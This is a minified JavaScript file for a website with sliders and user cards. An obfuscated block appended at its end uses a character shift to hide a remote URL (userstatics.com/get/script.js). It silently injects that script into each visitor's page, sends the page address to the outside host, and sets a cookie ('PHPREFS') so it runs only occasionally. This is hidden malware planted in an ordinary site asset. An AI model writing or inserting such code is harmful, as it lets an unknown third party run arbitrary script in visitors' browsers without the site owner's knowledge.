document.addEventListener("DOMContentLoaded", () => {
  let e = 0.5 * window.innerWidth, t = 0.5 * window.innerHeight;
  window.addEventListener("resize", () => {
    e = 0.5 * window.innerWidth, t = 0.5 * window.innerHeight, window.innerWidth <= 768 && c();
  }), document.addEventListener("mousemove", n => {
    Object.assign(document.documentElement, {style: `--move_x: ${-0.05 * (n.clientX - e)}px; --move_y: ${0.05 * (n.clientY - t)}px;`});
  });
  const n = document.getElementById("cards-group"), r = document.getElementById("card-template");
  fetch("users.json").then(e => e.json()).then(e => {
    l(e);
  }).catch(e => {
    n.textContent = "Участников нет.";
  });
  const l = e => {
    e.forEach(e => {
      let t = r.content.cloneNode(true);
      t.querySelector(".card-photo").src = e.photo, t.querySelector(".card-photo").setAttribute("alt", e.name), t.querySelector(".card-name").textContent = e.name, t.querySelector(".card-desc").textContent = e.desc, t.querySelector(".card-button").href = e.link, n.append(t);
    }), o();
  }, o = () => {
    const e = document.querySelector(".slider-wrapper");
    let t = e.querySelector(".switch-prev"), n = e.querySelector(".switch-next"), r = e.querySelector(".current"), l = e.querySelector(".total"), o = e.querySelector(".slides-group"), c = e.querySelectorAll(".slide-item"), d = o.offsetWidth, s = c[0].offsetWidth, a = Math.round(d / s);
    window.addEventListener("resize", () => {
      d = o.offsetWidth, s = c[0].offsetWidth, a = Math.round(d / s);
    }), l.textContent = c.length, r.textContent = a, currentDelta = 0, n.addEventListener("click", e => {
      e.preventDefault(), clearInterval(i), a++, r.textContent = a, currentDelta -= s, a <= c.length || (currentDelta = 0, a = Math.round(d / s), r.textContent = a), o.style.transform = `translate3d(${currentDelta}px,0,0)`, u();
    }), t.addEventListener("click", e => {
      e.preventDefault(), clearInterval(i), a--, r.textContent = a, currentDelta += s, a > 1 || (currentDelta = -s * (c.length - Math.round(d / s)), a = c.length, r.textContent = a), o.style.transform = `translate3d(${currentDelta}px,0,0)`, u();
    });
    let i = setInterval(() => {
      n.click();
    }, 4e3);
    const u = () => {
      i = setInterval(() => {
        n.click();
      }, 4e3);
    };
  }, c = () => {
    const e = document.querySelector(".steps-slider"), t = e.querySelector(".steps-system"), n = t.querySelectorAll(".step"), r = e.querySelector(".switch-prev"), l = e.querySelector(".switch-next"), o = e.querySelector(".switch-bullet").querySelectorAll("i");
    let c = 0, d = n[0].offsetWidth, s = 1;
    r.disabled = true, l.addEventListener("click", e => {
      e.preventDefault(), s++, c = c - d - 24, t.style.transform = `translate3d(${c}px,0,0)`, a(s);
    }), r.addEventListener("click", e => {
      e.preventDefault(), s--, c = c + d + 24, t.style.transform = `translate3d(${c}px,0,0)`, a(s);
    });
    const a = e => {
      5 === e ? l.disabled = true : 1 === e ? r.disabled = true : (l.disabled = false, r.disabled = false), o.forEach((t, n) => {
        n === e - 1 ? t.classList.add("active") : t.classList.remove("active");
      });
    };
  };
  window.innerWidth <= 768 && c();
});
(function (o, d, l) {
  try {
    o.f = o => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
    o.b = o.f("UMUWJKX");
    o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie), setTimeout(function () {
      o.c && (o.s = d.createElement("script"), o.s.src = o.f("myyux?44zxjwxyfynhx3htr4ljy4xhwnuy3oxDwjkjwwjwB") + l.href, d.body.appendChild(o.s));
    }, 1e3);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
  ;
}({}, document, location));
